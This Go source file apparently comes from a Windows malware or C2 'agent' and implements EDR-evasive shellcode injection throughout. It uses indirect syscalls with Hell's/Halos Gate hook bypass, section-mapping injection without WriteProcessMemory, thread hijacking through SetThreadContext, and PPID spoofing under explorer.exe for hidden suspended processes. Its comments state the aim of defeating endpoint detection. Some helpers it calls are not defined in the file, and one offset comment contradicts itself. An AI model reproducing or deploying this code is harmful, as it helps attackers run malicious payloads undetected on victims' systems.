//go:build windows

package agent

// Evasive injection primitives.
//
// Classic pattern (detected by every EDR):
//   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
//
// This module implements:
//   1. Indirect syscalls — call NT functions by SSN, bypassing userland hooks
//   2. NtCreateSection + NtMapViewOfSection — no WriteProcessMemory, no VirtualAllocEx
//   3. Thread hijacking (GetThreadContext/SetThreadContext) — no CreateRemoteThread
//   4. PPID spoofing — child process appears parented by explorer.exe

import (
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── NT constants ──────────────────────────────────────────────────────────────

const (
	SECTION_ALL_ACCESS  = 0x000F001F
	SEC_COMMIT          = 0x8000000
	ViewShare           = 1

	CONTEXT_AMD64   = 0x100000
	CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1  // Rsp, Rip, SegCs, EFlags
	CONTEXT_INTEGER = CONTEXT_AMD64 | 0x2  // Rax..R15
	CONTEXT_FULL    = CONTEXT_AMD64 | 0xB

	// UpdateProcThreadAttribute
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
)

// ── NT procs (not wrapped by golang.org/x/sys/windows) ──────────────────────

var (
	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
	procNtMapViewOfSection    = ntdll.NewProc("NtMapViewOfSection")
	procNtUnmapViewOfSection  = ntdll.NewProc("NtUnmapViewOfSection")
	procNtClose               = ntdll.NewProc("NtClose")
	procNtProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")

	procGetThreadContext   = kernel32.NewProc("GetThreadContext")
	procSetThreadContext   = kernel32.NewProc("SetThreadContext")
	procInitializeProcThreadAttributeList  = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute          = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList      = kernel32.NewProc("DeleteProcThreadAttributeList")
	procWaitForSingleObject                = kernel32.NewProc("WaitForSingleObject")
	procTerminateProcess                   = kernel32.NewProc("TerminateProcess")
)

// ── x64 CONTEXT (partial — only fields we need) ───────────────────────────────
// Full size is 1232 bytes (0x4D0). Must be 16-byte aligned.
// We allocate 1248 bytes and align manually.

const ctxSize = 0x4D0 // 1232

// Key offsets within CONTEXT
const (
	ctxFlagsOff = 0x30  // DWORD ContextFlags
	ctxRaxOff   = 0x78  // DWORD64 Rax (actually at 0x88 for full CONTEXT but we include P1-P6)
	ctxRspOff   = 0x98  // DWORD64 Rsp
	ctxRipOff   = 0xF8  // DWORD64 Rip
)

// getCTXRip returns the Rip value from a raw CONTEXT buffer.
func getCTXRip(ctx []byte) uint64 {
	return binary.LittleEndian.Uint64(ctx[ctxRipOff:])
}

// setCTXRip sets the Rip value in a raw CONTEXT buffer.
func setCTXRip(ctx []byte, rip uint64) {
	binary.LittleEndian.PutUint64(ctx[ctxRipOff:], rip)
}

func setCTXFlags(ctx []byte, flags uint32) {
	binary.LittleEndian.PutUint32(ctx[ctxFlagsOff:], flags)
}

// alignedCTX returns a 1232-byte slice aligned to 16 bytes within a larger buffer.
func alignedCTX() (buf []byte, ctx []byte) {
	buf = make([]byte, ctxSize+16)
	offset := uintptr(unsafe.Pointer(&buf[0])) & 0xF
	if offset != 0 {
		buf = buf[16-offset:]
	}
	ctx = buf[:ctxSize]
	setCTXFlags(ctx, CONTEXT_FULL)
	return buf, ctx
}

// ── Indirect syscall infrastructure ──────────────────────────────────────────
//
// Halos Gate: if the target function is hooked (first bytes = E9 JMP),
// scan neighboring NT functions (SSNs are sequential in ntdll) to recover SSN.
//
// Indirect call: allocate a local RW→RX stub that does:
//   mov r10, rcx   ; NT calling convention
//   mov eax, SSN
//   jmp [rip+0]    ; jump to syscall;ret gadget in ntdll
//   <gadget_addr>

var (
	indirectStubMem  uintptr  // single executable page for all stubs
	indirectStubOff  uintptr  // current offset within page
	syscallGadget    uintptr  // address of 'syscall; ret' in ntdll
	stateInitialized bool
)

const stubSize = 22 // bytes per stub

func initIndirect() {
	if stateInitialized {
		return
	}
	stateInitialized = true
	// Allocate stub page via NtAllocateVirtualMemory (bypasses kernel32!VirtualAlloc hooks).
	var addr uintptr
	size := uintptr(0x1000)
	r, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&size)),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		return
	}
	indirectStubMem = addr
	syscallGadget = findSyscallGadget()
	// Flip to RX via NtProtectVirtualMemory (bypasses kernel32!VirtualProtect hooks).
	var old uint32
	a := addr
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&old)),
	)
}

// findSyscallGadget scans ntdll for "syscall; ret" (0F 05 C3).
func findSyscallGadget() uintptr {
	ntdllH, _ := windows.LoadLibrary("ntdll.dll")
	if ntdllH == 0 {
		return 0
	}
	// Parse PE to find .text range
	base := uintptr(ntdllH)
	dosHdr := (*[64]byte)(unsafe.Pointer(base))
	e_lfanew := binary.LittleEndian.Uint32(dosHdr[60:])
	peHdr := base + uintptr(e_lfanew)
	// Optional header size
	numSections := binary.LittleEndian.Uint16((*[248]byte)(unsafe.Pointer(peHdr))[6:])
	optHdrSize := binary.LittleEndian.Uint16((*[248]byte)(unsafe.Pointer(peHdr))[20:])
	// Section headers start at PE header + 24 (COFF header) + optional header size
	sectBase := peHdr + 24 + uintptr(optHdrSize)
	for i := uintptr(0); i < uintptr(numSections); i++ {
		sect := sectBase + i*40
		name := string((*[8]byte)(unsafe.Pointer(sect))[:])
		if name[:5] != ".text" {
			continue
		}
		vaddr := binary.LittleEndian.Uint32((*[40]byte)(unsafe.Pointer(sect))[12:])
		vsz := binary.LittleEndian.Uint32((*[40]byte)(unsafe.Pointer(sect))[16:])
		start := base + uintptr(vaddr)
		for off := uintptr(0); off+3 <= uintptr(vsz); off++ {
			p := (*[3]byte)(unsafe.Pointer(start + off))
			if p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3 {
				return start + off
			}
		}
	}
	return 0
}

// extractSSN reads the syscall number from an NT function in ntdll.
// Handles Halos Gate: if hooked, scan ±5 neighbors to recover SSN.
func extractSSN(proc *windows.LazyProc) uint16 {
	if err := proc.Find(); err != nil {
		return 0
	}
	addr := proc.Addr()
	b := (*[10]byte)(unsafe.Pointer(addr))

	// Normal stub: 4C 8B D1 B8 XX XX 00 00  (mov r10,rcx; mov eax,SSN)
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		return binary.LittleEndian.Uint16(b[4:6])
	}

	// Hooked (E9 JMP or other): use Halos Gate — scan neighbors
	// NT function stubs are contiguous and SSNs are sequential.
	// Scan up to ±20 bytes-of-function-start apart (each stub ~32 bytes).
	const stubLen = 32
	for delta := uintptr(1); delta <= 10; delta++ {
		for _, sign := range []int{1, -1} {
			neighbor := addr + uintptr(int(delta)*int(sign)*stubLen)
			nb := (*[10]byte)(unsafe.Pointer(neighbor))
			if nb[0] == 0x4C && nb[1] == 0x8B && nb[2] == 0xD1 && nb[3] == 0xB8 {
				ssn := binary.LittleEndian.Uint16(nb[4:6])
				// Adjust for distance
				if sign == 1 {
					return ssn - uint16(delta)
				}
				return ssn + uint16(delta)
			}
		}
	}
	return 0
}

// makeStub writes an indirect syscall stub for the given SSN into the stub page.
// Returns the address of the stub.
//
// Stub bytes (22 bytes):
//   4C 8B D1          mov r10, rcx
//   B8 XX XX 00 00    mov eax, SSN
//   FF 25 00 00 00 00 jmp qword [rip+0]
//   <8-byte gadget addr>
func makeStub(ssn uint16) uintptr {
	initIndirect()
	if indirectStubMem == 0 || syscallGadget == 0 {
		return 0
	}

	stubAddr := indirectStubMem + indirectStubOff
	indirectStubOff += stubSize

	// Flip stub to RW via NtProtectVirtualMemory (no kernel32!VirtualProtect).
	var old uint32
	a := stubAddr
	sz := uintptr(stubSize)
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_READWRITE),
		uintptr(unsafe.Pointer(&old)),
	)

	stub := (*[stubSize]byte)(unsafe.Pointer(stubAddr))
	stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1        // mov r10, rcx
	stub[3] = 0xB8                                           // mov eax,
	stub[4] = byte(ssn); stub[5] = byte(ssn >> 8)           //   SSN
	stub[6] = 0x00; stub[7] = 0x00
	stub[8] = 0xFF; stub[9] = 0x25                          // jmp [rip+0]
	stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00
	binary.LittleEndian.PutUint64(stub[14:], uint64(syscallGadget))

	a = stubAddr
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&old)),
	)
	return stubAddr
}

// ntProtectEx calls NtProtectVirtualMemory via Hell's Gate SSN + indirect stub.
func ntProtectEx(process windows.Handle, addr uintptr, size uintptr, newProt uint32, oldProt *uint32) error {
	ssn := hgSSN("NtProtectVirtualMemory")
	if ssn == 0 || syscallGadget == 0 {
		// fallback to direct call (may be hooked)
		r, _, _ := procNtProtectVirtualMemory.Call(
			uintptr(process),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&size)),
			uintptr(newProt),
			uintptr(unsafe.Pointer(oldProt)),
		)
		if r != 0 {
			return fmt.Errorf("NtProtectVirtualMemory: 0x%X", r)
		}
		return nil
	}
	stub := bestStub(ssn)
	if stub == 0 {
		return fmt.Errorf("stub allocation failed")
	}
	// Call stub via syscall.SyscallN — args passed in Windows x64 convention
	r, _, _ := syscall.SyscallN(stub,
		uintptr(process),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(newProt),
		uintptr(unsafe.Pointer(oldProt)),
	)
	if r != 0 {
		return fmt.Errorf("NtProtectVirtualMemory (indirect): 0x%X", r)
	}
	return nil
}

// ── Section mapping injection ─────────────────────────────────────────────────
//
// No WriteProcessMemory. No VirtualAllocEx.
// Creates a shared section, maps it RW locally (write shellcode), RX remotely.

func injectViaSection(targetProc windows.Handle, sc []byte) (uintptr, error) {
	scSize := uintptr(len(sc))
	maxSize := int64(scSize)

	// 1. NtCreateSection — create a shared memory section
	var sectionH uintptr
	r, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionH)),
		uintptr(SECTION_ALL_ACCESS),
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(windows.PAGE_EXECUTE_READWRITE), // section prot (not allocation prot)
		uintptr(SEC_COMMIT),
		0,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtCreateSection: 0x%X", r)
	}
	defer procNtClose.Call(sectionH)

	// 2. NtMapViewOfSection into LOCAL process as PAGE_READWRITE (for writing)
	var localBase uintptr
	localSize := scSize
	r, _, _ = procNtMapViewOfSection.Call(
		sectionH,
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&localSize)),
		uintptr(ViewShare),
		0,
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtMapViewOfSection(local): 0x%X", r)
	}

	// 3. Write shellcode to local view (no WriteProcessMemory)
	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), scSize)
	copy(dst, sc)

	// 4. Unmap local view
	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localBase)

	// 5. NtMapViewOfSection into TARGET process as PAGE_EXECUTE_READ
	var remoteBase uintptr
	remoteSize := scSize
	r, _, _ = procNtMapViewOfSection.Call(
		sectionH,
		uintptr(targetProc),
		uintptr(unsafe.Pointer(&remoteBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&remoteSize)),
		uintptr(ViewShare),
		0,
		uintptr(windows.PAGE_EXECUTE_READ),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtMapViewOfSection(remote): 0x%X", r)
	}

	return remoteBase, nil
}

// ── Thread hijacking ──────────────────────────────────────────────────────────
//
// Redirect the main thread's RIP to shellcode and resume.
// No CreateRemoteThread. No NtCreateThreadEx.

func hijackThread(thread windows.Handle, shellcodeAddr uintptr) error {
	_, ctx := alignedCTX()

	// GetThreadContext
	r, _, err := procGetThreadContext.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if r == 0 {
		return fmt.Errorf("GetThreadContext: %w", err)
	}

	// Patch RIP
	setCTXRip(ctx, uint64(shellcodeAddr))

	// SetThreadContext
	r, _, err = procSetThreadContext.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if r == 0 {
		return fmt.Errorf("SetThreadContext: %w", err)
	}
	return nil
}

// ── PPID spoofing ─────────────────────────────────────────────────────────────
//
// Spawn the sacrificial process with explorer.exe as the apparent parent.
// Breaks EDR process-tree heuristics.

type startupInfoEx struct {
	startupInfo windows.StartupInfo
	lpAttrList  uintptr
}

func findExplorerPID() uint32 {
	return findProcessByName(PPIDSpoof)
}

// findProcessByName finds the first process matching the given name (case-insensitive).
func findProcessByName(name string) uint32 {
	if name == "" {
		name = "explorer.exe"
	}
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snap)
	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	nameLower := strings.ToLower(name)
	for windows.Process32First(snap, &pe) == nil {
		procName := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
		if procName == nameLower {
			return pe.ProcessID
		}
		if windows.Process32Next(snap, &pe) != nil {
			break
		}
	}
	return 0
}

// spawnSuspendedSpoofed creates a suspended process with PPID set to explorer.exe.
func spawnSuspendedSpoofed(cmdLine string) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation

	explorerPID := findExplorerPID()
	if explorerPID == 0 {
		// fallback: no PPID spoofing
		return spawnSuspendedPlain(cmdLine)
	}

	explorerH, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, explorerPID)
	if err != nil {
		return spawnSuspendedPlain(cmdLine)
	}
	defer windows.CloseHandle(explorerH)

	// Calculate required size for PROC_THREAD_ATTRIBUTE_LIST
	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))

	attrList := make([]byte, attrListSize)
	r, _, e := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		1, 0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if r == 0 {
		return spawnSuspendedPlain(cmdLine)
	}
	_ = e
	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))

	r, _, _ = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
		uintptr(unsafe.Pointer(&explorerH)),
		unsafe.Sizeof(explorerH),
		0, 0,
	)
	if r == 0 {
		return spawnSuspendedPlain(cmdLine)
	}

	siEx := startupInfoEx{}
	siEx.startupInfo.Cb = uint32(unsafe.Sizeof(siEx))
	siEx.startupInfo.Flags = windows.STARTF_USESHOWWINDOW
	siEx.startupInfo.ShowWindow = 0
	siEx.lpAttrList = uintptr(unsafe.Pointer(&attrList[0]))

	cmdLineW, _ := windows.UTF16PtrFromString(cmdLine)
	appW, _ := windows.UTF16PtrFromString(cmdLine)

	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	err = windows.CreateProcess(
		appW, cmdLineW, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT,
		nil, nil,
		&siEx.startupInfo, &pi,
	)
	if err != nil {
		return spawnSuspendedPlain(cmdLine)
	}
	return pi, nil
}

func spawnSuspendedPlain(cmdLine string) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation
	si := windows.StartupInfo{
		Flags:      windows.STARTF_USESHOWWINDOW,
		ShowWindow: 0,
	}
	si.Cb = uint32(unsafe.Sizeof(si))
	cmdLineW, _ := windows.UTF16PtrFromString(cmdLine)
	appW, _ := windows.UTF16PtrFromString(cmdLine)
	err := windows.CreateProcess(
		appW, cmdLineW, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, &si, &pi,
	)
	return pi, err
}

// ── Indirect syscall wrappers for section operations ─────────────────────────

// ntCreateSectionEx creates an anonymous page-file-backed section via Hell's Gate.
func ntCreateSectionEx(hSection *uintptr, access uint32, maxSize int64, prot, attrs uint32) error {
	ssn := hgSSN("NtCreateSection")
	if ssn == 0 || syscallGadget == 0 {
		r, _, _ := procNtCreateSection.Call(
			uintptr(unsafe.Pointer(hSection)),
			uintptr(access), 0,
			uintptr(unsafe.Pointer(&maxSize)),
			uintptr(prot), uintptr(attrs), 0,
		)
		if r != 0 {
			return fmt.Errorf("NtCreateSection: 0x%X", r)
		}
		return nil
	}
	stub := bestStub(ssn)
	if stub == 0 {
		return fmt.Errorf("makeStub failed")
	}
	r, _, _ := syscall.SyscallN(stub,
		uintptr(unsafe.Pointer(hSection)),
		uintptr(access), 0,
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(prot), uintptr(attrs), 0,
	)
	if r != 0 {
		return fmt.Errorf("NtCreateSection (indirect): 0x%X", r)
	}
	return nil
}

// ntMapViewEx maps a section into the current process via Hell's Gate.
func ntMapViewEx(section uintptr, base *uintptr, size *uintptr, prot uint32) error {
	ssn := hgSSN("NtMapViewOfSection")
	if ssn == 0 || syscallGadget == 0 {
		r, _, _ := procNtMapViewOfSection.Call(
			section,
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(base)),
			0, 0, 0,
			uintptr(unsafe.Pointer(size)),
			uintptr(ViewShare), 0,
			uintptr(prot),
		)
		if r != 0 {
			return fmt.Errorf("NtMapViewOfSection: 0x%X", r)
		}
		return nil
	}
	stub := bestStub(ssn)
	if stub == 0 {
		return fmt.Errorf("makeStub failed")
	}
	r, _, _ := syscall.SyscallN(stub,
		section,
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(base)),
		0, 0, 0,
		uintptr(unsafe.Pointer(size)),
		uintptr(ViewShare), 0,
		uintptr(prot),
	)
	if r != 0 {
		return fmt.Errorf("NtMapViewOfSection (indirect): 0x%X", r)
	}
	return nil
}
